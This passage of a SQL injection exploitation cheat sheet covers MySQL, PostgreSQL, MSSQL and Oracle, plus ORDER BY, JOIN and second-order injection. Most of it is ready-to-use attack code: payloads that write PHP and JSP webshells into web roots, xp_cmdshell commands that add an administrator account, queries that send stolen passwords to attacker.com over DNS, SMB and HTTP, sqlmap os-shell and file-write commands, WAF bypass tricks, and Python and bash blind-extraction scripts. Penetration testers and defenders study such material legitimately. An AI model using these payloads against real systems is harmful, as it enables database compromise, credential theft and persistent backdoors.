' UNION SELECT 1, LOAD_FILE('/etc/passwd')--
' UNION SELECT LOAD_FILE('/var/www/html/config.php')--
' UNION SELECT LOAD_FILE(0x2f6574632f706173737764)--  -- Hex-encoded path
```

**Writing Files (Requires FILE privilege and secure_file_priv not set):**

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/var/www/html/shell.php'--

-- With specific formatting
' UNION SELECT '<?php eval($_POST[0]); ?>' INTO DUMPFILE '/var/www/html/backdoor.php'--
```

**Checking File Permissions:**

```sql
' UNION SELECT @@secure_file_priv, @@datadir--
-- Empty result = no restriction
-- NULL = disabled
-- Directory path = restricted to that directory
```

#### Authentication Bypass Techniques

**Hash Dumping:**

```sql
' UNION SELECT user, password FROM mysql.user--
-- MySQL < 5.7: 16-byte hash (old_password)
-- MySQL 5.7+: mysql_native_password (SHA1-based)

' UNION SELECT user, authentication_string FROM mysql.user--  -- MySQL 5.7+
```

**UDF Exploitation ([Unverified - requires specific conditions]):**

```sql
-- Creating malicious UDF (requires plugin_dir write access)
CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_malicious.so';
SELECT sys_exec('whoami');
```

### PostgreSQL Exploitation

#### System Information Gathering

**Version and Configuration:**

```sql
' UNION SELECT version(), current_database()--
' UNION SELECT current_user, session_user--
' UNION SELECT inet_server_addr(), inet_server_port()::text--
```

**Database Structure:**

```sql
-- List schemas
' UNION SELECT schema_name, NULL FROM information_schema.schemata--

-- Tables in schema
' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='public'--

-- Columns with types
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'--
```

**Role and Privilege Enumeration:**

```sql
' UNION SELECT rolname, rolsuper::text FROM pg_roles--
' UNION SELECT usename, usesuper::text FROM pg_user--
' UNION SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name='users'--
```

#### PostgreSQL-Specific Attack Vectors

**File System Access:**

```sql
-- Read file (requires superuser or pg_read_server_files role)
' UNION SELECT pg_read_file('/etc/passwd', 0, 1000)--

-- List directory
' UNION SELECT pg_ls_dir('/var/www')--

-- Get file stats
' UNION SELECT (pg_stat_file('/etc/passwd')).*--
```

**Command Execution Methods:**

**1. COPY TO/FROM PROGRAM (PostgreSQL 9.3+):**

```sql
'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(data text);--
'; COPY cmd_output FROM PROGRAM 'id';--
'; SELECT * FROM cmd_output;--
```

**2. Large Object Manipulation:**

```sql
-- Import file as large object
'; SELECT lo_import('/etc/passwd', 31337);--
-- Export to accessible location
'; SELECT lo_export(31337, '/tmp/loot.txt');--
-- Read via lo_get
'; SELECT CAST(lo_get(31337) AS text);--
```

**3. PL/Python or PL/Perl (if installed):**

```sql
-- PL/Python example ([Unverified] - requires extension installation)
CREATE OR REPLACE FUNCTION exec_shell(cmd text) RETURNS text AS $$
import subprocess
return subprocess.check_output(cmd, shell=True)
$$ LANGUAGE plpythonu;

SELECT exec_shell('whoami');
```

**XML External Entity (XXE) via xml type:**

```sql
'; SELECT XMLPARSE(DOCUMENT '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>');--
```

### MSSQL (Microsoft SQL Server) Exploitation

#### Reconnaissance Queries

**System Information:**

```sql
' UNION SELECT @@version, @@servername--
' UNION SELECT SYSTEM_USER, CURRENT_USER--
' UNION SELECT SUSER_NAME(), USER_NAME()--
' UNION SELECT DB_NAME(), HOST_NAME()--
```

**Database Enumeration:**

```sql
-- All databases
' UNION SELECT name, dbid FROM master..sysdatabases--
-- Or
' UNION SELECT name, database_id FROM sys.databases--

-- Tables in current database
' UNION SELECT name, object_id FROM sys.tables--

-- Columns for table
' UNION SELECT name, system_type_id FROM sys.columns WHERE object_id=OBJECT_ID('users')--
```

**Privilege and Role Checks:**

```sql
' UNION SELECT name, type_desc FROM sys.server_principals--
' UNION SELECT name, is_srvrolemember('sysadmin', name) FROM sys.server_principals--
' UNION SELECT SUSER_NAME(), IS_SRVROLEMEMBER('sysadmin')--
```

#### xp_cmdshell Exploitation

**Enabling xp_cmdshell:**

```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

**Command Execution:**

```sql
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'net user attacker P@ssw0rd /add';--
'; EXEC xp_cmdshell 'net localgroup administrators attacker /add';--
```

**Capturing Output:**

```sql
'; CREATE TABLE cmd_output (output varchar(8000));--
'; INSERT INTO cmd_output EXEC xp_cmdshell 'ipconfig';--
'; SELECT * FROM cmd_output;--
```

#### File Operations and Reading

**OLE Automation Procedures:**

```sql
-- Enable
'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;--

-- Read file
'; DECLARE @file INT; DECLARE @text VARCHAR(8000);--
'; EXEC sp_OACreate 'Scripting.FileSystemObject', @file OUT;--
'; EXEC sp_OAMethod @file, 'OpenTextFile', @text OUT, 'C:\windows\win.ini', 1;--
```

**BULK INSERT for File Reading:**

```sql
'; CREATE TABLE temp(data varchar(8000));--
'; BULK INSERT temp FROM 'C:\windows\win.ini';--
'; SELECT * FROM temp;--
```

#### Out-of-Band Data Exfiltration

**DNS Exfiltration:**

```sql
'; DECLARE @data varchar(1024); SELECT @data=(SELECT TOP 1 password FROM users);--
'; EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"');--
```

**UNC Path SMB Connection:**

```sql
'; EXEC xp_dirtree '\\attacker.com\share';--
-- Captures NTLM hash if successful
```

**HTTP-Based ([Inference] - requires additional SP configuration):**

```sql
'; DECLARE @url varchar(1024); SET @url='http://attacker.com/log?data='+(SELECT TOP 1 password FROM users);--
'; EXEC sp_OACreate 'MSXML2.ServerXMLHttp', @obj OUT;--
'; EXEC sp_OAMethod @obj, 'open', NULL, 'GET', @url, false;--
'; EXEC sp_OAMethod @obj, 'send';--
```

### Oracle Exploitation

#### Information Gathering

**System and Version Details:**

```sql
' UNION SELECT banner, NULL FROM v$version WHERE ROWNUM=1--
' UNION SELECT version, NULL FROM v$instance WHERE ROWNUM=1--
' UNION SELECT user, NULL FROM dual--
' UNION SELECT sys_context('USERENV', 'SESSION_USER'), NULL FROM dual--
```

**Database Structure:**

```sql
-- All tables accessible to current user
' UNION SELECT table_name, owner FROM all_tables WHERE ROWNUM <= 10--

-- Columns for specific table
' UNION SELECT column_name, data_type FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM <= 10--

-- User-owned tables only
' UNION SELECT table_name, NULL FROM user_tables WHERE ROWNUM <= 10--
```

**Privilege Enumeration:**

```sql
' UNION SELECT privilege, NULL FROM session_privs WHERE ROWNUM <= 10--
' UNION SELECT granted_role, NULL FROM user_role_privs WHERE ROWNUM <= 10--
' UNION SELECT grantee, privilege FROM dba_sys_privs WHERE grantee='PUBLIC' AND ROWNUM <= 10--
```

#### Oracle-Specific Injection Techniques

**Error-Based Extraction (UTL_INADDR):**

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1))--
```

**Error-Based (CTXSYS.DRITHSX.SN):**

```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
```

**XML-Based Extraction:**

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'), '/foo'), NULL FROM dual--
```

**Time-Based with DBMS_LOCK:**

```sql
' AND (SELECT CASE WHEN (SUBSTR(user,1,1)='S') THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual) IS NOT NULL--
```

**Heavy Query Time Delay Alternative:**

```sql
' AND (SELECT COUNT(*) FROM all_objects, all_objects, all_objects) > 0--
```

#### Command Execution and File Operations

**Java Stored Procedures ([Unverified] - requires CREATE PROCEDURE privileges):**

**Step 1: Create Java Source**

```sql
'; BEGIN EXECUTE IMMEDIATE 'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Command" AS import java.io.*; public class Command { public static String exec(String cmd) throws IOException { StringBuffer output = new StringBuffer(); Process p = Runtime.getRuntime().exec(cmd); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = reader.readLine()) != null) { output.append(line + "\n"); } return output.toString(); }}'; END;--
```

**Step 2: Create PL/SQL Wrapper:**

```sql
'; BEGIN EXECUTE IMMEDIATE 'CREATE OR REPLACE FUNCTION run_cmd(p_cmd VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME ''Command.exec(java.lang.String) return java.lang.String'''; END;--
```

**Step 3: Execute:**

```sql
' UNION SELECT run_cmd('whoami'), NULL FROM dual--
```

**File Writing via UTL_FILE:**

```sql
-- First, check accessible directories
' UNION SELECT directory_path, NULL FROM all_directories WHERE ROWNUM=1--

-- Write file
'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f := UTL_FILE.FOPEN('DATA_PUMP_DIR', 'shell.jsp', 'W'); UTL_FILE.PUT_LINE(f, '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'); UTL_FILE.FCLOSE(f); END;--
```

**Out-of-Band via UTL_HTTP ([Inference] - requires network ACLs configured):**

```sql
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/log?data='||(SELECT password FROM users WHERE ROWNUM=1)), NULL FROM dual--
```

---

## Tool-Specific Commands for Advanced SQLi

### sqlmap Advanced Options

**Stacked Query Testing:**

```bash
sqlmap -u "http://target.com/page?id=1" --technique=S --batch
```

**Database-Specific Exploitation:**

```bash
# Force DBMS type
sqlmap -u "http://target.com/page?id=1" --dbms=MySQL --os-shell

# OS command execution
sqlmap -u "http://target.com/page?id=1" --os-cmd="whoami"

# File operations
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**Advanced Tuning:**

```bash
# Optimize for specific database
sqlmap -u "http://target.com/page?id=1" --dbms=PostgreSQL --technique=BEUSTQ --threads=10

# Custom injection markers
sqlmap -u "http://target.com/search" --data="query=test*&submit=1" --batch

# Second-order injection
sqlmap -u "http://target.com/register" --data="user=*&pass=test" --second-url="http://target.com/profile"
```

### Manual Testing with curl and Python

**Boolean-Based Extraction Script:**

```python
import requests
import string

def extract_data(position, query_template):
    charset = string.ascii_letters + string.digits + '_@.-'
    for char in charset:
        payload = query_template.format(position=position, char=char)
        r = requests.get(f"http://target.com/page?id=1' AND {payload}--")
        if "True_indicator" in r.text:
            return char
    return None

# Example usage
result = ""
for i in range(1, 20):
    char = extract_data(i, "ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{position},1))='{char}'")
    if char:
        result += char
        print(f"Extracted: {result}")
```

**Time-Based Blind with curl:**

```bash
# Test single character
time curl "http://target.com/page?id=1' AND IF(ASCII(SUBSTRING(database(),1,1))=100,SLEEP(5),0)-- -"

# Automated with bash loop
for i in {97..122}; do
  echo -n "Testing char $(printf \\x$(printf %x $i)): "
  time=$(curl -w "%{time_total}" -o /dev/null -s "http://target.com/page?id=1' AND IF(ASCII(SUBSTRING(database(),1,1))=$i,SLEEP(3),0)-- -")
  if (( $(echo "$time > 3" | bc -l) )); then
    echo "FOUND: $(printf \\x$(printf %x $i))"
    break
  fi
done
```

---

## Important Caveats and Detection Considerations

**[Inference]** Modern web application firewalls (WAFs) commonly detect:

- Keyword patterns (UNION, SELECT, OR 1=1)
- Comment sequences (-- , /*, #)
- Encoded payloads (URL encoding, hex, base64)
- Time-based patterns (repeated SLEEP/WAITFOR)

**Bypass techniques may include:**

- Case variation: `UnIoN SeLeCt`
- Inline comments: `UN/**/ION SE/**/LECT`
- Encoding chains: Double URL encoding, Unicode
- Alternative syntax: `UNION SELECT` vs `UNION ALL SELECT`

**[Unverified]** Detection rates vary significantly by WAF vendor and configuration.

**Related topics for deeper exploitation:**

- Second-order SQL injection techniques
- NoSQL injection (MongoDB, CouchDB)
- ORM injection patterns (Hibernate, SQLAlchemy)
- Polyglot payloads for filter evasion
- DNS and HTTP exfiltration automation

---

## SQLi in ORDER BY Clause

### Understanding ORDER BY Context

The ORDER BY clause presents unique challenges because it expects column names or positions, not typical SQL expressions. String concatenation and UNION-based techniques often fail, requiring specialized approaches.

### Detection Techniques

#### Basic Detection

```sql
-- Test for vulnerability by triggering errors
?sort=column_name'
?sort=column_name"
?sort=1'
?sort=1"

-- Valid column position test
?sort=1  -- Should work
?sort=999  -- Should trigger error if vulnerable

-- Boolean-based detection
?sort=(CASE WHEN (1=1) THEN column_name ELSE other_column END)
?sort=(SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END)
```

#### Confirming with Conditional Responses

```sql
-- If query returns different ordering, SQLi exists
?sort=IF(1=1,column_name,another_column)
?sort=CASE WHEN 1=1 THEN column_name ELSE another_column END

-- Time-based confirmation
?sort=IF(1=1,column_name,(SELECT SLEEP(5)))
?sort=(SELECT IF(1=1,column_name,(SELECT SLEEP(5))))
```

### Exploitation Techniques

#### Boolean-Based Blind SQLi in ORDER BY

```sql
-- Extract database name length (MySQL)
?sort=IF(LENGTH(DATABASE())>5,username,email)
-- Observe ordering change to determine true/false

-- Character-by-character extraction
?sort=IF(ASCII(SUBSTRING(DATABASE(),1,1))>100,username,email)
?sort=IF(ASCII(SUBSTRING(DATABASE(),1,1))=109,username,email)  -- 'm'

-- Extract table names
?sort=IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),1,1))>100,username,email)

-- PostgreSQL equivalent
?sort=CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>100 THEN username ELSE email END
```

#### Time-Based Blind SQLi in ORDER BY

```sql
-- MySQL
?sort=IF(1=1,username,SLEEP(5))
?sort=(SELECT IF(LENGTH(DATABASE())>5,username,SLEEP(5)))
?sort=IF(ASCII(SUBSTRING(DATABASE(),1,1))=109,username,(SELECT SLEEP(5)))

-- PostgreSQL
?sort=(SELECT CASE WHEN LENGTH(current_database())>5 THEN username ELSE pg_sleep(5) END)
?sort=(CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>100 THEN username ELSE (SELECT pg_sleep(5)) END)

-- Microsoft SQL Server
?sort=CASE WHEN LEN(DB_NAME())>5 THEN username ELSE (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4) END
?sort=IF(ASCII(SUBSTRING(DB_NAME(),1,1))=109,username,WAITFOR DELAY '0:0:5')  -- Note: IF may not work in all contexts
```

#### Error-Based SQLi in ORDER BY

```sql
-- MySQL - Extract data through error messages
?sort=(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)

-- Extracting data via UpdateXML
?sort=EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))
?sort=UpdateXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1)

-- PostgreSQL - Cast-based errors
?sort=CAST((SELECT current_database()) AS int)
?sort=CAST((SELECT version()) AS numeric)

-- MSSQL - Convert errors
?sort=CONVERT(int,(SELECT @@version))
?sort=CONVERT(int,(SELECT DB_NAME()))
```

#### Stacked Queries in ORDER BY

```sql
-- MySQL (requires specific configurations)
?sort=username;INSERT INTO users VALUES('hacker','pass123')--

-- PostgreSQL
?sort=username;CREATE TABLE test(data text);--
?sort=username;COPY test FROM '/etc/passwd';--

-- MSSQL
?sort=username;EXEC xp_cmdshell('whoami');--
?sort=username;EXEC sp_configure 'show advanced options',1;RECONFIGURE;--
```

### Automated Exploitation with sqlmap

```bash
# Basic ORDER BY detection
sqlmap -u "http://target.com/products?sort=name" --level=5 --risk=3

# Specify injection point explicitly
sqlmap -u "http://target.com/products?sort=name*" --batch

# Using request file with marked injection point
# request.txt content:
# GET /products?sort=name* HTTP/1.1
# Host: target.com
sqlmap -r request.txt --batch

# Time-based testing for ORDER BY
sqlmap -u "http://target.com/products?sort=name" --technique=T --level=5

# Boolean-based testing
sqlmap -u "http://target.com/products?sort=name" --technique=B --level=5

# Force specific DBMS
sqlmap -u "http://target.com/products?sort=name" --dbms=mysql --level=5

# Extract data after confirmation
sqlmap -u "http://target.com/products?sort=name" --level=5 --dbs
sqlmap -u "http://target.com/products?sort=name" -D database_name --tables
sqlmap -u "http://target.com/products?sort=name" -D database_name -T users --dump
```

### Manual Python Script for ORDER BY Exploitation

```python
#!/usr/bin/env python3
import requests
import string
import time

def time_based_extract(url, param, query_template):
    """Extract data using time-based blind SQLi in ORDER BY"""
    result = ""
    charset = string.ascii_lowercase + string.digits + "_-."
    
    # Extract length first
    length = 0
    for i in range(1, 50):
        payload = query_template.format(f"LENGTH({query})>{i}")
        full_url = f"{url}?{param}={payload}"
        start = time.time()
        try:
            requests.get(full_url, timeout=10)
            elapsed = time.time() - start
            if elapsed < 3:  # No delay, condition false
                length = i
                break
        except:
            pass
    
    print(f"[+] Length: {length}")
    
    # Extract character by character
    for pos in range(1, length + 1):
        for char in charset:
            payload = query_template.format(
                f"ASCII(SUBSTRING({query},{pos},1))={ord(char)}"
            )
            full_url = f"{url}?{param}={payload}"
            start = time.time()
            try:
                requests.get(full_url, timeout=10)
                elapsed = time.time() - start
                if elapsed >= 3:  # Delay occurred, condition true
                    result += char
                    print(f"[+] Found: {result}")
                    break
            except:
                pass
    
    return result

# Example usage
url = "http://target.com/products"
param = "sort"
# MySQL example
query_template = "IF({},username,SLEEP(3))"
query = "DATABASE()"
database_name = time_based_extract(url, param, query_template)
print(f"[+] Database: {database_name}")
```

### Database-Specific Payloads

#### MySQL/MariaDB

```sql
-- Extract database version
?sort=IF(SUBSTRING(VERSION(),1,1)='5',id,(SELECT SLEEP(5)))
?sort=IF(SUBSTRING(VERSION(),1,1)='8',id,(SELECT SLEEP(5)))

-- Extract current user
?sort=IF(SUBSTRING(USER(),1,4)='root',id,(SELECT SLEEP(5)))

-- Extract privileges
?sort=IF((SELECT super_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1))='Y',id,(SELECT SLEEP(5)))

-- File operations
?sort=IF((SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL,id,(SELECT SLEEP(5)))
```

#### PostgreSQL

```sql
-- Version extraction
?sort=(CASE WHEN SUBSTRING(version(),1,10)='PostgreSQL' THEN id ELSE (SELECT pg_sleep(5)) END)

-- Current database
?sort=(CASE WHEN LENGTH(current_database())>5 THEN id ELSE (SELECT pg_sleep(5)) END)

-- Read file
?sort=(CASE WHEN (SELECT LENGTH(pg_read_file('/etc/passwd')))>0 THEN id ELSE (SELECT pg_sleep(5)) END)

-- Code execution (requires privileges)
?sort=(CASE WHEN (SELECT COUNT(*) FROM pg_stat_activity)>0 THEN id ELSE (COPY (SELECT '') TO PROGRAM 'id > /tmp/output') END)
```

#### Microsoft SQL Server

```sql
-- Version extraction
?sort=CASE WHEN @@VERSION LIKE '%Microsoft%' THEN id ELSE (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3) END

-- Current database
?sort=CASE WHEN LEN(DB_NAME())>5 THEN id ELSE (WAITFOR DELAY '0:0:5') END

-- xp_cmdshell execution (if enabled)
?sort=id;EXEC xp_cmdshell 'whoami > c:\output.txt';--

-- Enable xp_cmdshell
?sort=id;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
```

#### Oracle

```sql
-- Version extraction
?sort=(CASE WHEN (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%' THEN column_name ELSE (SELECT COUNT(*) FROM all_users,all_users) END)

-- Time delay
?sort=(CASE WHEN 1=1 THEN column_name ELSE (SELECT dbms_pipe.receive_message('a',5) FROM dual) END)

-- Current user
?sort=(CASE WHEN LENGTH(USER)>5 THEN column_name ELSE (SELECT dbms_pipe.receive_message('a',5) FROM dual) END)
```

## SQLi in JOIN Clauses

### Understanding JOIN Context

JOIN clauses combine rows from multiple tables based on related columns. SQLi in JOIN conditions can expose data from unintended tables or bypass access controls.

### Common Vulnerable Patterns

```sql
-- Vulnerable JOIN with user input
SELECT * FROM users u 
JOIN profiles p ON u.id = p.user_id 
WHERE u.username = 'INPUT'

-- Vulnerable ON condition
SELECT * FROM users u 
JOIN profiles p ON u.id = 'INPUT' 

-- Vulnerable table name in JOIN
SELECT * FROM users u 
JOIN INPUT ON u.id = table.user_id
```

### Detection Techniques

#### Basic Detection

```bash
# Test for syntax errors
?join=users' 
?join=users"
?join=users`)
?join=users`

# Test valid table names
?join=users
?join=profiles
?join=orders

# Boolean-based detection
?join=users WHERE 1=1--
?join=users WHERE 1=2--
```

#### Advanced Detection

```sql
-- Subquery injection in JOIN
?table=(SELECT * FROM users) AS subq
?table=(SELECT username FROM users WHERE username='admin') AS admin_data

-- UNION in JOIN context
?join=users UNION SELECT 1,2,3,4--
?join=users UNION SELECT NULL,username,password,NULL FROM admin--

-- Comment-based detection
?join=users-- 
?join=users#
?join=users/*
```

### Exploitation Techniques

#### Data Extraction via JOIN Manipulation

```sql
-- Expose data from additional tables
?join=users u LEFT JOIN admin_users a ON u.id=a.id

-- Force cartesian product for data exposure
?join=users,information_schema.tables

-- Subquery-based extraction
?join=(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()) AS tables ON 1=1

-- MySQL example: Extract all usernames
?join=users u LEFT JOIN (SELECT username FROM admin_users) a ON 1=1
```

#### Boolean-Based Blind SQLi in JOIN

```sql
-- MySQL
?join=users u JOIN profiles p ON IF(LENGTH(DATABASE())>5,u.id,0)=p.user_id

-- PostgreSQL
?join=users u JOIN profiles p ON (CASE WHEN LENGTH(current_database())>5 THEN u.id ELSE 0 END)=p.user_id

-- Character extraction
?join=users u JOIN profiles p ON IF(ASCII(SUBSTRING(DATABASE(),1,1))>100,u.id,0)=p.user_id
```

#### Time-Based Blind SQLi in JOIN

```sql
-- MySQL
?join=users u JOIN profiles p ON IF(1=1,u.id,SLEEP(5))=p.user_id
?join=users u JOIN profiles p ON (SELECT IF(LENGTH(DATABASE())>5,u.id,SLEEP(5)))=p.user_id

-- PostgreSQL
?join=users u JOIN profiles p ON (CASE WHEN 1=1 THEN u.id ELSE pg_sleep(5) END)=p.user_id

-- MSSQL
?join=users u JOIN profiles p ON (CASE WHEN 1=1 THEN u.id ELSE (WAITFOR DELAY '0:0:5') END)=p.user_id
```

#### Error-Based SQLi in JOIN

```sql
-- MySQL - ExtractValue
?join=users u JOIN profiles p ON (EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e)))=p.user_id

-- MySQL - UpdateXML
?join=users u JOIN profiles p ON (UpdateXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1))=p.user_id

-- PostgreSQL - Cast errors
?join=users u JOIN profiles p ON CAST((SELECT version()) AS int)=p.user_id

-- MSSQL - Convert errors
?join=users u JOIN profiles p ON CONVERT(int,(SELECT @@version))=p.user_id
```

#### UNION-Based SQLi in JOIN

```sql
-- Determine column count
?join=users UNION SELECT NULL--
?join=users UNION SELECT NULL,NULL--
?join=users UNION SELECT NULL,NULL,NULL--

-- Extract data once column count matches
?join=users UNION SELECT username,password,email FROM admin_users--
?join=users UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=DATABASE()--

-- Multi-table extraction
?join=users UNION SELECT a.username,a.password,u.email FROM admin_users a,users u--
```

### Bypassing JOIN-Based Access Controls

```sql
-- Original query (intended to restrict access):
SELECT * FROM documents d 
JOIN user_permissions p ON d.id=p.doc_id 
WHERE p.user_id=1

-- Bypass by manipulating JOIN condition
?doc_id=1 OR 1=1--
-- Results in: JOIN user_permissions p ON d.id=1 OR 1=1--

-- Access all documents
?doc_id=1 UNION SELECT id FROM documents--

-- Bypass using subquery
?doc_id=(SELECT id FROM documents LIMIT 1)
```

### Advanced JOIN Injection Scenarios

#### Cross-Database JOIN (MySQL)

```sql
-- Access other databases via JOIN
?join=users u JOIN mysql.user m ON u.username=m.user

-- Extract credentials from mysql.user
?join=users u LEFT JOIN (SELECT user,authentication_string FROM mysql.user) m ON 1=1
```

#### Lateral JOIN Exploitation (PostgreSQL)

```sql
-- Use LATERAL for correlated subqueries
?join=users u CROSS JOIN LATERAL (SELECT * FROM pg_read_file('/etc/passwd')) f

-- Extract sensitive data
?join=users u CROSS JOIN LATERAL (SELECT version()) v
```

#### Recursive CTE in JOIN (PostgreSQL/Modern Databases)

```sql
-- Recursive data extraction
?join=users u JOIN (WITH RECURSIVE cte AS (SELECT 1 AS n UNION ALL SELECT n+1 FROM cte WHERE n<100) SELECT * FROM cte) r ON u.id=r.n
```

### Automated Detection and Exploitation

```bash
# sqlmap with JOIN injection
sqlmap -u "http://target.com/api?join=users" --level=5 --risk=3

# Specify injection point in JOIN
sqlmap -u "http://target.com/api?join=users*" --batch --dbms=mysql

# Test all parameters including JOIN
sqlmap -u "http://target.com/api?user=1&join=profiles" --level=5 --risk=3 -p join

# Custom injection markers
sqlmap -u "http://target.com/api" --data="join=users*&filter=active" --method=POST
```

### Manual Python Script for JOIN SQLi

```python
#!/usr/bin/env python3
import requests
import sys

def test_join_sqli(base_url, param, payloads):
    """Test for SQLi in JOIN clause"""
    results = []
    
    for payload in payloads:
        url = f"{base_url}?{param}={payload}"
        try:
            response = requests.get(url, timeout=5)
            results.append({
                'payload': payload,
                'status': response.status_code,
                'length': len(response.content),
                'time': response.elapsed.total_seconds()
            })
            print(f"[*] Testing: {payload}")
            print(f"    Status: {response.status_code}, Length: {len(response.content)}, Time: {response.elapsed.total_seconds()}s")
        except Exception as e:
            print(f"[-] Error with payload {payload}: {str(e)}")
    
    return results

# Test payloads
payloads = [
    "users",
    "users'",
    "users\"",
    "users--",
    "users/*",
    "users WHERE 1=1--",
    "users WHERE 1=2--",
    "users UNION SELECT NULL--",
    "users UNION SELECT NULL,NULL--",
    "users UNION SELECT NULL,NULL,NULL--",
    "(SELECT * FROM information_schema.tables LIMIT 1) AS t",
    "users u LEFT JOIN admin_users a ON 1=1",
]

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <base_url> <parameter>")
        sys.exit(1)
    
    test_join_sqli(sys.argv[1], sys.argv[2], payloads)
```

## Second-Order SQLi Detection

### Understanding Second-Order SQLi

Second-order SQLi occurs when malicious input is stored in the database without proper sanitization, then later retrieved and used in an unsafe SQL query. The injection doesn't execute immediately but triggers during a subsequent operation.

### Attack Flow

```
1. Attacker submits malicious payload â†’ Stored in database
2. Application retrieves payload â†’ Used in SQL query
3. Malicious SQL executes â†’ Data breach/compromise
```

### Common Vulnerable Scenarios

#### User Profile Updates

```sql
-- Step 1: Register with malicious username
Username: admin'--
Email: attacker@evil.com

-- Stored in database:
INSERT INTO users (username, email) VALUES ('admin\'--', 'attacker@evil.com')

-- Step 2: Profile view/update query uses stored username
SELECT * FROM profiles WHERE username = 'admin'--'
-- Results in: SELECT * FROM profiles WHERE username = 'admin'
-- (rest of query commented out)
```

#### Search History Features

```sql
-- Step 1: Store malicious search term
Search: ' UNION SELECT password FROM admin--

-- Step 2: View search history
SELECT search_term FROM search_history WHERE user_id=1
-- Returns: ' UNION SELECT password FROM admin--

-- Step 3: Application uses search term in query
SELECT * FROM products WHERE name LIKE '%' UNION SELECT password FROM admin--%'
```

#### Password Reset Tokens

```sql
-- Step 1: Register with SQL payload in email
Email: attacker'||(SELECT password FROM admin WHERE username='admin')||'@evil.com

-- Step 2: Password reset generates query using stored email
UPDATE users SET reset_token='xyz' WHERE email='attacker'||(SELECT password FROM admin WHERE username='admin')||'@evil.com'
```

### Detection Methodology

#### Phase 1: Identify Storage Points

```bash
# Look for inputs that get stored:
- Registration forms
- Profile updates
- Comment/post submissions
- Search queries with history
- File uploads with metadata
- Configuration settings
- API endpoints that persist data
- Cart/wishlist items
- Custom fields
```

#### Phase 2: Injection Point Testing

```sql
-- Test payloads for storage
Username: test'||'xyz
Username: test'+'xyz  
Username: test' AND '1'='1
Username: test' AND SLEEP(5) AND '1'='1
Username: admin'--
Username: ' UNION SELECT NULL--

-- Store time-based payloads
Bio: ' AND SLEEP(5) AND '1'='1
Comment: ' OR (SELECT SLEEP(5)) AND '1'='1

-- Store boolean payloads
Description: ' AND 1=1--
Description: ' AND 1=2--

-- Store UNION payloads
Title: ' UNION SELECT username,password FROM admin--
```

#### Phase 3: Trigger Points Identification

```bash
# Actions that might retrieve and use stored data:
- Viewing profile
- Displaying username in header
- Search history review
- Admin panel viewing user data
- Email notifications
- Export functions (CSV, PDF)
- Reporting features
- Backup/restore operations
- Integration with third-party services
```

### Practical Detection Techniques

#### Time-Based Detection

```python
#!/usr/bin/env python3
import requests
import time

def test_second_order_time(register_url, trigger_url, username_payload):
    """Test for second-order SQLi using time delays"""
    
    # Step 1: Register with time-based payload
    register_data = {
        'username': username_payload,
        'email': 'test@test.com',
        'password': 'Password123!'
    }
    
    print(f"[*] Registering with payload: {username_payload}")
    r1 = requests.post(register_url, data=register_data)
    print(f"[+] Registration status: {r1.status_code}")
    
    # Wait a moment for database write
    time.sleep(2)
    
    # Step 2: Trigger the stored payload
    print("[*] Triggering payload...")
    start = time.time()
    r2 = requests.get(trigger_url)
    elapsed = time.time() - start
    
    print(f"[*] Response time: {elapsed:.2f}s")
    
    if elapsed >= 5:
        print("[!] VULNERABLE - Time delay detected!")
        return True
    else:
